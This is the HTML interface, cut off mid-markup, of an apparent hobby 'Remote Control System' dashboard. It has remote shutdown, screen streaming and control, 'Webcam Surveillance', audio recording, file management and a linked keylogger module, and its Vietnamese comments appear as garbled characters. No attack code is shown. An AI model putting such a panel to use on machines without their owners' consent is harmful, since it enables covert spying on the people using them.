<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>RCS - Remote Control System</title>
    <link
      rel="icon"
      href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üñ•Ô∏è</text></svg>"
    />

    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=Consolas&display=swap"
      rel="stylesheet"
    />
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
      rel="stylesheet"
    />
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.5/dist/chart.umd.min.js"></script>

    <link rel="stylesheet" href="css/variables.css" />
    <link rel="stylesheet" href="css/soft-ui-base.css" />
    <link rel="stylesheet" href="css/fixes.css" />
    <link rel="stylesheet" href="css/layout.css" />
    <link rel="stylesheet" href="css/components.css" />
    <link rel="stylesheet" href="css/modules/system-stats.css" />
    <link rel="stylesheet" href="css/modules/terminal.css" />
    <link rel="stylesheet" href="css/modules/webcam.css" />
    <link rel="stylesheet" href="css/modules/keylogger.css" />
    <link rel="stylesheet" href="css/modules/monitor.css" />
    <link rel="stylesheet" href="css/modules/audio.css" />
  </head>

  <body>
    <section id="login-overlay" class="overlay-container">
      <div class="login-card">
        <h2 class="mb-4 fw-bold text-primary">
          <i class="fas fa-shield-alt"></i> RCS Login
        </h2>
        <form id="login-form" onsubmit="event.preventDefault();">
          <div class="mb-3 text-start">
            <label class="form-label small fw-bold">Server IP</label>
            <input
              type="text"
              id="server-ip"
              class="form-control mb-2"
              value="localhost"
            />
            <div class="row">
              <div class="col-6">
                <label class="form-label small fw-bold">Port</label>
                <input
                  type="number"
                  id="server-port"
                  class="form-control mb-2"
                  value="8181"
                />
              </div>
              <div class="col-6">
                <label class="form-label small fw-bold">Password</label>
                <input
                  type="password"
                  id="auth-pass"
                  class="form-control mb-2"
                  value="123"
                />
              </div>
            </div>
          </div>
          <button
            type="submit"
            id="btn-connect"
            class="btn btn-primary w-100 fw-bold py-2"
          >
            CONNECT SYSTEM
          </button>
          <p id="login-error" class="mt-3 text-danger fw-bold small"></p>
        </form>
      </div>
    </section>

    <div class="d-flex disabled-ui" id="app-wrapper">
      <aside
        class="sidenav navbar navbar-vertical navbar-expand-xs border-0"
        id="sidebar"
      >
        <div class="sidenav-header">
          <i
            class="fas fa-times p-3 cursor-pointer text-secondary opacity-5 position-absolute end-0 top-0 d-none d-xl-none"
            aria-hidden="true"
            id="iconSidenav"
          ></i>
          <a
            class="navbar-brand m-0 d-flex align-items-center"
            style="cursor: pointer"
            id="logo-heading"
            title="Back to Dashboard"
          >
            <i
              class="fas fa-network-wired text-primary"
              style="font-size: 1.5rem"
            ></i>
            <span class="ms-2 font-weight-bold text-primary">RCS SYSTEM</span>
          </a>
        </div>
        <hr class="horizontal dark mt-0 mb-0" />
        <div
          class="navbar-collapse w-auto h-auto show"
          id="sidenav-collapse-main"
        >
          <ul class="navbar-nav">
            <li class="nav-item">
              <a class="nav-link active" data-tab="dashboard" role="button">
                <div
                  class="icon icon-shape icon-sm shadow border-radius-md bg-white text-center me-2 d-flex align-items-center justify-content-center"
                >
                  <i
                    class="fas fa-chart-line text-primary text-sm opacity-10"
                  ></i>
                </div>
                <span class="nav-link-text ms-1">Overview</span>
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" data-tab="monitor" role="button">
                <div
                  class="icon icon-shape icon-sm shadow border-radius-md bg-white text-center me-2 d-flex align-items-center justify-content-center"
                >
                  <i class="fas fa-desktop text-info text-sm opacity-10"></i>
                </div>
                <span class="nav-link-text ms-1">Screen Monitor</span>
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" data-tab="webcam" role="button">
                <div
                  class="icon icon-shape icon-sm shadow border-radius-md bg-white text-center me-2 d-flex align-items-center justify-content-center"
                >
                  <i class="fas fa-camera text-success text-sm opacity-10"></i>
                </div>
                <span class="nav-link-text ms-1">Webcam Control</span>
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" data-tab="audio" role="button">
                <div
                  class="icon icon-shape icon-sm shadow border-radius-md bg-white text-center me-2 d-flex align-items-center justify-content-center"
                >
                  <i
                    class="fas fa-microphone text-danger text-sm opacity-10"
                  ></i>
                </div>
                <span class="nav-link-text ms-1">Audio Recorder</span>
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" data-tab="processes" role="button">
                <div
                  class="icon icon-shape icon-sm shadow border-radius-md bg-white text-center me-2 d-flex align-items-center justify-content-center"
                >
                  <i class="fas fa-tasks text-warning text-sm opacity-10"></i>
                </div>
                <span class="nav-link-text ms-1">Process & Apps</span>
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" data-tab="files" id="nav-files" role="button">
                <div
                  class="icon icon-shape icon-sm shadow border-radius-md bg-white text-center me-2 d-flex align-items-center justify-content-center"
                >
                  <i
                    class="fas fa-folder-open text-info text-sm opacity-10"
                  ></i>
                </div>
                <span class="nav-link-text ms-1">File Manager</span>
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" data-tab="terminal" role="button">
                <div
                  class="icon icon-shape icon-sm shadow border-radius-md bg-white text-center me-2 d-flex align-items-center justify-content-center"
                >
                  <i class="fas fa-terminal text-dark text-sm opacity-10"></i>
                </div>
                <span class="nav-link-text ms-1">Terminal Logs</span>
              </a>
            </li>
            <li class="nav-item mt-3">
              <a
                class="nav-link bg-gradient-danger"
                id="btn-disconnect"
                role="button"
              >
                <div
                  class="icon icon-shape icon-sm border-radius-md text-center me-2 d-flex align-items-center justify-content-center"
                >
                  <i class="fas fa-sign-out-alt text-white text-sm"></i>
                </div>
                <span class="nav-link-text ms-1 text-white">Disconnect</span>
              </a>
            </li>
          </ul>
        </div>
      </aside>

      <main
        class="main-content position-relative max-height-vh-100 h-100 border-radius-lg"
        id="page-content"
      >
        <nav
          class="navbar navbar-main navbar-expand-lg px-0 mx-4 shadow-none border-radius-xl"
          id="navbarBlur"
        >
          <div class="container-fluid py-1 px-3">
            <button
              id="menu-toggle"
              class="btn btn-link text-dark p-0 me-3 d-inline-block"
              style="font-size: 1.25rem"
            >
              <i class="fas fa-bars"></i>
            </button>
            <nav aria-label="breadcrumb">
              <ol
                class="breadcrumb bg-transparent mb-0 pb-0 pt-1 px-0 me-sm-6 me-5"
              >
                <li class="breadcrumb-item text-sm">
                  <a
                    class="opacity-5 text-dark"
                    id="breadcrumb-root"
                    href="javascript:;"
                    >Pages</a
                  >
                </li>
                <li
                  class="breadcrumb-item text-sm text-dark active font-weight-bolder"
                  aria-current="page"
                  id="breadcrumb-current"
                >
                  Overview
                </li>
              </ol>
              <h6 class="font-weight-bolder mb-0" id="page-title">Overview</h6>
            </nav>
            <div
              class="collapse navbar-collapse mt-sm-0 mt-2 me-md-0 me-sm-4"
              id="navbar"
            >
              <div class="ms-md-auto pe-md-3 d-flex align-items-center gap-3">
                <button
                  id="theme-toggle"
                  class="btn btn-outline-primary btn-sm border-radius-lg"
                  title="Toggle Dark Mode"
                >
                  <i class="fas fa-moon me-2"></i>
                  <span class="d-none d-sm-inline">Dark Mode</span>
                </button>

                <div
                  id="ping-badge"
                  class="ping-pill good"
                  style="display: none"
                >
                  <div class="ping-status">
                    <span class="ping-dot"></span>
                    <span>Online</span>
                  </div>
                  <div class="ping-latency">
                    <i class="fas fa-wifi"></i>
                    <span id="ping-value">-- ms</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </nav>
        <div class="container-fluid py-4">
          <section id="tab-dashboard" class="tab-content active">
            <!-- PH·∫¶N TR√äN: Power Control & Quick Launch -->
            <div class="row mb-4">
              <div class="col-md-6">
                <div class="card-custom">
                  <div class="card-header-custom">
                    <i class="fas fa-power-off text-danger"></i> Power Control
                  </div>
                  <div class="d-grid gap-2">
                    <button id="btn-shutdown" class="btn btn-danger">
                      <i class="fas fa-power-off"></i> SHUTDOWN SERVER
                    </button>
                    <button id="btn-restart" class="btn btn-warning text-dark">
                      <i class="fas fa-sync"></i> RESTART SERVER
                    </button>
                  </div>
                </div>
              </div>
              <div class="col-md-6">
                <div class="card-custom">
                  <div class="card-header-custom">
                    <i class="fas fa-rocket text-primary"></i> Quick Launch
                  </div>
                  <div class="input-group mb-3">
                    <input
                      type="text"
                      id="quickAppInput"
                      class="form-control"
                      placeholder="App name (e.g. notepad, calc, mspaint)"
                    />
                    <button id="btn-run-app" class="btn btn-primary">
                      <i class="fas fa-play"></i> Run
                    </button>
                    <button
                      onclick="browseApps()"
                      class="btn btn-warning text-dark fw-bold"
                    >
                      <i class="fas fa-th-large"></i> Library
                    </button>
                  </div>
                  <label class="small fw-bold text-secondary mb-2"
                    >Web Browser Shortcuts:</label
                  >
                  <div class="d-flex gap-2 justify-content-between">
                    <button
                      data-url="https://facebook.com"
                      class="btn btn-outline-primary flex-fill btn-web-launch"
                    >
                      <i class="fab fa-facebook-f"></i> FB
                    </button>
                    <button
                      data-url="https://youtube.com"
                      class="btn btn-outline-danger flex-fill btn-web-launch"
                    >
                      <i class="fab fa-youtube"></i> YT
                    </button>
                    <button
                      data-url="https://gmail.com"
                      class="btn btn-outline-danger flex-fill btn-web-launch"
                    >
                      <i class="fas fa-envelope"></i> Mail
                    </button>
                    <button
                      data-url="https://google.com"
                      class="btn btn-outline-success flex-fill btn-web-launch"
                    >
                      <i class="fab fa-google"></i> Web
                    </button>
                  </div>
                </div>
              </div>
            </div>

            <!-- PH·∫¶N D∆Ø·ªöI: System Information (tr√°i) + Performance Stats (ph·∫£i) -->
            <div class="row">
              <!-- PH·∫¶N D∆Ø·ªöI TR√ÅI: System Information Cards -->
              <div class="col-lg-6">
                <h5 class="section-title mb-3">
                  <i class="fas fa-info-circle me-2 text-primary"></i>System
                  Information
                </h5>
                <div class="system-info-cards">
                  <!-- OS Card -->
                  <div class="info-card">
                    <div class="info-card__icon">
                      <i class="fab fa-windows"></i>
                    </div>
                    <div class="info-card__content">
                      <div class="info-card__label">H·ªÜ ƒêI·ªÄU H√ÄNH</div>
                      <div class="info-card__value" id="os-info">
                        Loading...
                      </div>
                    </div>
                  </div>

                  <!-- Hostname Card -->
                  <div class="info-card">
                    <div class="info-card__icon">
                      <i class="fas fa-desktop"></i>
                    </div>
                    <div class="info-card__content">
                      <div class="info-card__label">T√äN M√ÅY (HOSTNAME)</div>
                      <div class="info-card__value" id="pc-name">
                        Loading...
                      </div>
                    </div>
                  </div>

                  <!-- CPU Model Card -->
                  <div class="info-card">
                    <div class="info-card__icon">
                      <i class="fas fa-microchip"></i>
                    </div>
                    <div class="info-card__content">
                      <div class="info-card__label">CPU MODEL</div>
                      <div class="info-card__value" id="cpu-name">
                        Loading...
                      </div>
                    </div>
                  </div>

                  <!-- Disk Card -->
                  <div class="info-card">
                    <div class="info-card__icon">
                      <i class="fas fa-hdd"></i>
                    </div>
                    <div class="info-card__content">
                      <div class="info-card__label">·ªî C·ª®NG CH√çNH</div>
                      <div class="info-card__value" id="disk-name">---</div>
                    </div>
                  </div>

                  <!-- GPU Card -->
                  <div class="info-card">
                    <div class="info-card__icon">
                      <i class="fas fa-video"></i>
                    </div>
                    <div class="info-card__content">
                      <div class="info-card__label">CARD ƒê·ªí H·ªåA (GPU)</div>
                      <div class="info-card__value" id="gpu-name">
                        Loading...
                      </div>
                    </div>
                  </div>

                  <!-- VRAM Card -->
                  <div class="info-card">
                    <div class="info-card__icon">
                      <i class="fas fa-memory"></i>
                    </div>
                    <div class="info-card__content">
                      <div class="info-card__label">VRAM</div>
                      <div class="info-card__value" id="vram-val">--</div>
                    </div>
                  </div>

                  <!-- Hidden compatibility fields -->
                  <div style="display: none">
                    <span id="cpu-max">--</span>
                    <span id="cpu-cores">--</span>
                  </div>
                </div>
              </div>

              <!-- PH·∫¶N D∆Ø·ªöI PH·∫¢I: Performance Stats 4-Grid -->
              <div class="col-lg-6">
                <h5 class="section-title mb-3">
                  <i class="fas fa-tachometer-alt me-2 text-success"></i
                  >Performance
                </h5>
                <div class="performance-grid">
                  <!-- CPU Gauge - Top Left -->
                  <div class="perf-cell perf-cell--gauge">
                    <div class="perf-cell__title">CPU LOAD</div>
                    <div class="gauge gauge--md">
                      <svg class="gauge__svg" viewBox="0 0 140 140">
                        <circle
                          class="gauge__track"
                          cx="70"
                          cy="70"
                          r="55"
                          fill="none"
                        ></circle>
                        <circle
                          class="gauge__progress"
                          id="stat-cpu-gauge"
                          cx="70"
                          cy="70"
                          r="55"
                          fill="none"
                        ></circle>
                      </svg>
                      <div class="gauge__center">
                        <span class="gauge__value" id="stat-cpu-percent"
                          >0%</span
                        >
                        <span class="gauge__sub" id="stat-cpu-freq">--</span>
                      </div>
                    </div>
                    <span class="stat-badge state-ok" id="stat-cpu-badge"
                      >Normal</span
                    >
                  </div>

                  <!-- GPU Bar - Top Right -->
                  <div class="perf-cell perf-cell--bar">
                    <div class="perf-cell__title">GPU</div>
                    <div class="bar-vertical bar-vertical--lg">
                      <div class="bar-vertical__fill" id="stat-gpu-bar"></div>
                    </div>
                    <div class="perf-cell__value" id="stat-gpu-percent">0%</div>
                    <span class="stat-badge state-ok" id="stat-gpu-badge"
                      >Idle</span
                    >
                    <div class="perf-cell__info" id="stat-gpu-info">--</div>
                  </div>

                  <!-- RAM Bar - Bottom Left -->
                  <div class="perf-cell perf-cell--bar">
                    <div class="perf-cell__title">RAM</div>
                    <div class="bar-vertical bar-vertical--lg">
                      <div class="bar-vertical__fill" id="stat-ram-bar"></div>
                    </div>
                    <div class="perf-cell__value" id="stat-ram-percent">0%</div>
                    <span class="stat-badge state-ok" id="stat-ram-badge"
                      >OK</span
                    >
                    <div class="perf-cell__info" id="stat-ram-abs">--</div>
                  </div>

                  <!-- DISK Gauge - Bottom Right -->
                  <div class="perf-cell perf-cell--gauge">
                    <div class="perf-cell__title">DISK (C:)</div>
                    <div class="gauge gauge--md">
                      <svg class="gauge__svg" viewBox="0 0 140 140">
                        <circle
                          class="gauge__track"
                          cx="70"
                          cy="70"
                          r="55"
                          fill="none"
                        ></circle>
                        <circle
                          class="gauge__progress"
                          id="stat-ssd-gauge"
                          cx="70"
                          cy="70"
                          r="55"
                          fill="none"
                        ></circle>
                      </svg>
                      <div class="gauge__center">
                        <span class="gauge__value" id="stat-ssd-percent"
                          >0%</span
                        >
                      </div>
                    </div>
                    <span class="stat-badge state-ok" id="stat-ssd-badge"
                      >Healthy</span
                    >
                    <div class="gauge__sub-info">
                      <div id="stat-ssd-abs">--</div>
                    </div>
                  </div>

                  <!-- Hidden compatibility elements -->
                  <div style="display: none">
                    <span id="stat-ssd-name">Primary Disk</span>
                    <span id="stat-ssd-free">--</span>
                  </div>

                  <div class="realtime-indicator">
                    <i class="fas fa-sync-alt"></i> C·∫≠p nh·∫≠t th·ªùi gian th·ª±c...
                  </div>
                </div>
              </div>
            </div>
          </section>

          <section id="tab-monitor" class="tab-content">
            <div class="row">
              <div class="col-lg-8">
                <div class="card h-100">
                  <div class="card-header pb-0">
                    <div
                      class="d-flex justify-content-between align-items-center"
                    >
                      <div class="d-flex align-items-center">
                        <div
                          class="icon icon-shape bg-gradient-danger shadow text-center border-radius-md me-2"
                        >
                          <i class="fas fa-video opacity-10"></i>
                        </div>
                        <h6 class="mb-0 d-flex align-items-center gap-2">
                          Live Screen Streaming
                          <span id="monitor-fps" class="badge bg-success"
                            >FPS: 0</span
                          >
                        </h6>
                      </div>
                      <div class="d-flex gap-2 align-items-center">
                        <div class="form-check form-switch me-2">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            id="control-toggle"
                            style="cursor: pointer"
                          />
                          <label
                            class="form-check-label text-xs ms-1"
                            for="control-toggle"
                            style="cursor: pointer"
                            >Control</label
                          >
                        </div>

                        <button
                          id="btn-monitor-toggle"
                          onclick="toggleMonitor()"
                          class="btn btn-sm btn-success mb-0"
                        >
                          <i class="fas fa-play"></i>
                          <span id="btn-monitor-text">Start</span>
                        </button>

                        <div class="btn-group btn-group-sm" role="group">
                          <button
                            class="btn btn-outline-secondary mb-0"
                            onclick="monitorZoom('out')"
                            title="Zoom Out"
                          >
                            <i class="fas fa-search-minus"></i>
                          </button>
                          <button
                            class="btn btn-outline-secondary mb-0"
                            onclick="monitorZoom('reset')"
                            title="Reset (100%)"
                          >
                            <i class="fas fa-compress-arrows-alt"></i>
                          </button>
                          <button
                            class="btn btn-outline-secondary mb-0"
                            onclick="monitorZoom('in')"
                            title="Zoom In"
                          >
                            <i class="fas fa-search-plus"></i>
                          </button>
                        </div>

                        <button
                          class="btn btn-sm btn-outline-primary mb-0"
                          onclick="monitorToggleFit()"
                          title="Toggle Fit Mode"
                          id="btn-monitor-fit"
                        >
                          <i class="fas fa-expand-arrows-alt"></i>
                        </button>

                        <button
                          class="btn btn-sm btn-outline-warning mb-0"
                          onclick="monitorFullscreen()"
                          title="Fullscreen"
                        >
                          <i class="fas fa-expand"></i>
                        </button>
                      </div>
                    </div>
                  </div>

                  <div class="card-body p-3">
                    <div class="monitor-frame" id="monitor-container">
                      <div class="zoom-indicator" id="monitor-zoom-level">
                        100%
                      </div>

                      <div
                        id="screen-placeholder"
                        class="text-secondary text-center"
                      >
                        <div
                          class="icon icon-shape icon-xl bg-gradient-secondary shadow-secondary text-center border-radius-xl mb-3 mx-auto"
                        >
                          <i
                            class="fas fa-satellite-dish opacity-10 text-lg"
                          ></i>
                        </div>
                        <h6 class="text-secondary">Stream Offline</h6>
                        <p class="text-xs text-secondary mb-0">
                          Click Start to begin streaming
                        </p>
                      </div>
                      <img id="live-screen" src="" alt="Live Stream" />
                    </div>
                  </div>
                </div>
              </div>

              <div class="col-lg-4">
                <div class="card h-100">
                  <div class="card-header pb-0">
                    <div class="d-flex align-items-center">
                      <div
                        class="icon icon-shape bg-gradient-info shadow text-center border-radius-md me-2"
                      >
                        <i class="fas fa-camera opacity-10"></i>
                      </div>
                      <div>
                        <h6 class="mb-0">Screen Snapshot</h6>
                        <p class="text-xs text-secondary mb-0">
                          Capture high-quality screenshot
                        </p>
                      </div>
                    </div>
                  </div>

                  <div class="card-body p-3">
                    <button
                      onclick="sendCommand('CAPTURE_SCREEN')"
                      class="btn btn-primary w-100 mb-3"
                    >
                      <i class="fas fa-camera me-2"></i> Capture Now
                    </button>

                    <hr class="horizontal dark my-3" />

                    <h6
                      class="text-xs text-uppercase text-secondary font-weight-bolder mb-2"
                    >
                      <i class="fas fa-history me-1"></i> Recent Capture:
                    </h6>

                    <div
                      id="preview-container"
                      class="border rounded p-2 bg-gray-100 mt-2"
                      style="
                        min-height: 150px;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                      "
                    >
                      <p
                        class="text-xs text-secondary font-italic mb-0"
                        id="preview-text"
                      >
                        No captures yet
                      </p>
                      <img
                        id="captured-preview"
                        class="img-fluid rounded shadow-sm hidden"
                        onclick="viewFullImage(this)"
                        style="cursor: zoom-in"
                      />
                    </div>
                    <div class="mt-2 text-end">
                      <span class="badge badge-success hidden" id="save-badge"
                        ><i class="fas fa-check"></i> Saved</span
                      >
                    </div>
                    <hr class="horizontal dark my-3" />

                    <h5 class="fw-bold mb-3 text-danger">
                      <i class="fas fa-circle"></i> Recording
                    </h5>
                    <div
                      id="monitor-recording-timer-container"
                      class="recording-timer-container mb-2"
                      style="display: none"
                    >
                      <span class="label">Remaining:</span>
                      <span id="monitor-recording-countdown" class="countdown"
                        >00s</span
                      >
                    </div>
                    <div class="mb-3">
                      <label class="form-label small fw-bold"
                        >Duration (sec):</label
                      >
                      <input
                        type="number"
                        id="monitor-record-duration"
                        class="form-control"
                        value="10"
                        min="5"
                        max="120"
                      />
                    </div>

                    <button
                      id="btn-monitor-record"
                      onclick="startRecordScreen()"
                      class="btn btn-danger w-100 fw-bold"
                      disabled
                    >
                      <i class="fas fa-record-vinyl"></i> RECORD SCREEN & SAVE
                    </button>
                    <button
                      id="btn-monitor-cancel"
                      onclick="cancelRecordScreen()"
                      class="btn btn-warning w-100 fw-bold mt-2"
                      disabled
                    >
                      <i class="fas fa-stop-circle"></i> CANCEL RECORD
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </section>

          <section id="tab-webcam" class="tab-content">
            <div class="card-custom">
              <div class="card-header-custom">
                <span
                  ><i class="fas fa-eye text-danger"></i> Webcam
                  Surveillance</span
                >
                <span id="cam-status" class="badge bg-secondary">OFFLINE</span>
              </div>

              <div class="row p-3">
                <div class="col-md-8 text-center">
                  <div class="webcam-toolbar mb-2">
                    <div class="btn-group btn-group-sm" role="group">
                      <button
                        class="btn btn-outline-secondary"
                        onclick="webcamZoom('out')"
                        title="Zoom Out"
                      >
                        <i class="fas fa-search-minus"></i>
                      </button>
                      <button
                        class="btn btn-outline-secondary"
                        onclick="webcamZoom('reset')"
                        title="Reset Zoom"
                      >
                        <i class="fas fa-compress-arrows-alt"></i>
                      </button>
                      <button
                        class="btn btn-outline-secondary"
                        onclick="webcamZoom('in')"
                        title="Zoom In"
                      >
                        <i class="fas fa-search-plus"></i>
                      </button>
                    </div>

                    <button
                      class="btn btn-outline-primary btn-sm ms-2"
                      onclick="webcamToggleFit()"
                      title="Toggle Fit Mode"
                      id="btn-webcam-fit"
                    >
                      <i class="fas fa-expand-arrows-alt"></i>
                    </button>

                    <button
                      class="btn btn-outline-warning btn-sm ms-2"
                      onclick="webcamFullscreen()"
                      title="Fullscreen"
                    >
                      <i class="fas fa-expand"></i>
                    </button>

                    <span class="badge bg-info ms-3" id="webcam-zoom-level"
                      >100%</span
                    >
                  </div>

                  <div class="webcam-container" id="webcam-container">
                    <img id="webcam-feed" src="" />

                    <canvas id="video-canvas" style="display: none"></canvas>
                    <div
                      id="webcam-placeholder"
                      class="text-secondary text-center"
                    >
                      <i class="fas fa-video fa-3x mb-3 opacity-50"></i><br />
                      <small>Webcam Offline</small>
                    </div>
                  </div>
                </div>

                <div class="col-md-4">
                  <div class="bg-light p-3 rounded border">
                    <h5 class="fw-bold mb-3">
                      <i class="fas fa-sliders-h"></i> Controls
                    </h5>

                    <button
                      id="btn-webcam-toggle"
                      onclick="toggleWebcam()"
                      class="btn btn-success w-100 mb-2 fw-bold"
                      style="transition: all 0.3s ease"
                    >
                      <i class="fas fa-power-off"></i>
                      <span id="btn-webcam-text">START WEBCAM</span>
                    </button>

                    <hr />

                    <h5 class="fw-bold mb-3 text-danger">
                      <i class="fas fa-circle"></i> Recording
                    </h5>
                    <div
                      id="recording-timer-container"
                      class="recording-timer-container mb-2"
                      style="display: none"
                    >
                      <span class="label">Remaining:</span>
                      <span id="recording-countdown" class="countdown"
                        >00s</span
                      >
                    </div>
                    <div class="mb-3">
                      <label class="form-label small fw-bold"
                        >Duration (sec):</label
                      >
                      <input
                        type="number"
                        id="record-duration"
                        class="form-control"
                        value="10"
                        min="5"
                        max="60"
                      />
                    </div>

                    <button
                      id="btn-webcam-record"
                      onclick="startRecordWebcam()"
                      class="btn btn-danger w-100 fw-bold"
                      disabled
                    >
                      <i class="fas fa-record-vinyl"></i> RECORD & SAVE
                    </button>
                    <button
                      id="btn-webcam-cancel"
                      onclick="cancelRecordWebcam()"
                      class="btn btn-warning w-100 fw-bold mt-2"
                      disabled
                    >
                      <i class="fas fa-stop-circle"></i> CANCEL RECORD
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </section>

          <section id="tab-audio" class="tab-content">
            <div class="card h-100">
              <div class="card-header pb-0">
                <div class="d-flex justify-content-between align-items-center">
                  <div class="d-flex align-items-center">
                    <div
                      class="icon icon-shape bg-gradient-danger shadow text-center border-radius-md me-2"
                    >
                      <i class="fas fa-microphone opacity-10"></i>
                    </div>
                    <h6 class="mb-0">Audio Recorder</h6>
                  </div>
                </div>
              </div>

              <div class="card-body p-3">
                <div class="row">
                  <div class="col-lg-8">
                    <div class="audio-container" id="audio-container">
                      <canvas
                        id="audio-waveform-canvas"
                        width="600"
                        height="200"
                        style="
                          display: block;
                          width: 100%;
                          background: #000;
                          border-radius: 8px;
                        "
                      ></canvas>
                      <div
                        class="audio-placeholder text-secondary"
                        id="audio-placeholder"
                      >
                        <i class="fas fa-microphone fa-3x mb-2 opacity-60"></i>
                        <h6 class="text-secondary">No Audio</h6>
                        <p class="text-xs text-secondary">
                          Start audio to see waveform
                        </p>
                      </div>
                    </div>
                  </div>

                  <div class="col-lg-4">
                    <div class="bg-light p-3 rounded border">
                      <h5 class="fw-bold mb-3">
                        <i class="fas fa-sliders-h"></i> Controls
                      </h5>

                      <div class="mb-3">
                        <button
                          id="btn-audio-toggle"
                          onclick="toggleAudio()"
                          class="btn btn-success w-100 mb-2 fw-bold"
                        >
                          <i
                            class="fas fa-power-off me-2"
                            id="btn-audio-icon"
                          ></i>
                          <span id="btn-audio-text">Start</span>
                        </button>
                      </div>

                      <div class="mb-3">
                        <label class="form-label small fw-bold"
                          >Duration (sec):</label
                        >
                        <input
                          type="number"
                          id="audio-record-duration"
                          class="form-control"
                          value="10"
                          min="3"
                          max="60"
                        />
                      </div>

                      <div
                        id="audio-recording-timer-container"
                        class="recording-timer-container mb-2"
                        style="display: none"
                      >
                        <span class="label">Remaining:</span>
                        <span id="audio-recording-countdown" class="countdown"
                          >00s</span
                        >
                      </div>

                      <button
                        id="btn-audio-record"
                        onclick="startRecordAudio()"
                        class="btn btn-danger w-100 fw-bold"
                        disabled
                      >
                        <i class="fas fa-record-vinyl"></i> RECORD & SAVE
                      </button>
                      <button
                        id="btn-audio-cancel"
                        onclick="cancelRecordAudio()"
                        class="btn btn-warning w-100 fw-bold mt-2"
                        disabled
                      >
                        <i class="fas fa-stop-circle"></i> CANCEL RECORD
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="row mt-3">
              <div class="col-12">
                <div class="card-custom">
                  <div class="card-header-custom small-header">
                    <span
                      ><i class="fas fa-history me-1"></i> Recent
                      Recordings</span
                    >
                  </div>
                  <div class="p-3">
                    <div
                      id="audio-recent"
                      class="recent-recordings border rounded p-2 bg-gray-100"
                    >
                      <p class="text-xs text-secondary font-italic mb-0">
                        No recordings yet
                      </p>
                    </div>
                    <div id="audio-preview-container" class="mt-2"></div>
                  </div>
                </div>
              </div>
            </div>
          </section>

          <section id="tab-files" class="tab-content">
            <div class="card h-100 d-flex flex-column">
              <div class="card-header pb-0">
                <div class="d-flex align-items-center justify-content-between">
                  <div>
                    <h6 class="mb-0">File Manager</h6>
                    <nav aria-label="breadcrumb" class="mt-2">
                      <ol
                        class="breadcrumb bg-transparent mb-0 pb-0"
                        id="file-breadcrumb"
                      >
                        <li class="breadcrumb-item">
                          <a
                            href="#"
                            class="text-primary"
                            style="cursor: pointer"
                          >
                            <i class="fas fa-home"></i> My Computer
                          </a>
                        </li>
                      </ol>
                    </nav>
                  </div>
                  <div class="d-flex gap-2">
                    <button
                      class="btn btn-sm btn-primary mb-0"
                      onclick="getDrives()"
                      id="btn-file-home"
                    >
                      <i class="fas fa-home me-1"></i>Home
                    </button>
                    <button
                      class="btn btn-sm btn-outline-primary mb-0"
                      onclick="createNewFolder()"
                    >
                      <i class="fas fa-folder-plus me-1"></i>New Folder
                    </button>
                    <button
                      class="btn btn-sm btn-outline-secondary mb-0"
                      onclick="uploadFile()"
                    >
                      <i class="fas fa-upload me-1"></i>Upload
                    </button>
                  </div>
                </div>
              </div>

              <div class="px-3 pt-3 pb-0">
                <div class="input-group input-group-outline">
                  <input
                    type="text"
                    class="form-control"
                    placeholder="Search files and folders..."
                    id="file-search-input"
                    onkeyup="searchFiles()"
                  />
                  <span class="input-group-text">
                    <i class="fas fa-search"></i>
                  </span>
                </div>
              </div>

              <div class="card-body px-0 pt-0 pb-2 flex-grow-1 overflow-auto">
                <div
                  class="table-responsive p-0"
                  style="max-height: calc(100vh - 350px)"
                >
                  <table class="table align-items-center mb-0" id="file-table">
                    <thead>
                      <tr>
                        <th
                          class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7 ps-4"
                          style="width: 50px"
                        >
                          Type
                        </th>
                        <th
                          class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7 ps-2"
                          style="width: 45%"
                        >
                          Name
                        </th>
                        <th
                          class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7"
                          style="width: 18%"
                        >
                          Modified
                        </th>
                        <th
                          class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7"
                          style="width: 12%"
                        >
                          Size
                        </th>
                        <th
                          class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7 text-center pe-4"
                          style="width: 150px"
                        >
                          Actions
                        </th>
                      </tr>
                    </thead>
                    <tbody id="file-list-body">
                      <tr>
                        <td colspan="5" class="text-center py-5">
                          <div
                            class="d-flex flex-column align-items-center justify-content-center"
                            style="min-height: 300px"
                          >
                            <div
                              class="icon icon-shape icon-xl bg-gradient-primary shadow-primary text-center border-radius-xl mb-3"
                            >
                              <i
                                class="fas fa-folder-open opacity-10 text-lg"
                              ></i>
                            </div>
                            <h6 class="mb-1">No files yet</h6>
                            <p class="text-sm text-secondary mb-0">
                              Click "Home" to browse drives
                            </p>
                          </div>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </section>

          <section id="tab-processes" class="tab-content">
            <div class="card-custom">
              <div class="card-header-custom">
                <span
                  ><i class="fas fa-list-alt text-primary"></i> Task
                  Manager</span
                >
                <div class="d-flex align-items-center gap-2">
                  <button
                    id="btn-get-apps"
                    class="btn btn-outline-primary btn-sm"
                  >
                    Apps Only
                  </button>
                  <button
                    id="btn-get-processes"
                    class="btn btn-outline-secondary btn-sm"
                  >
                    All Processes
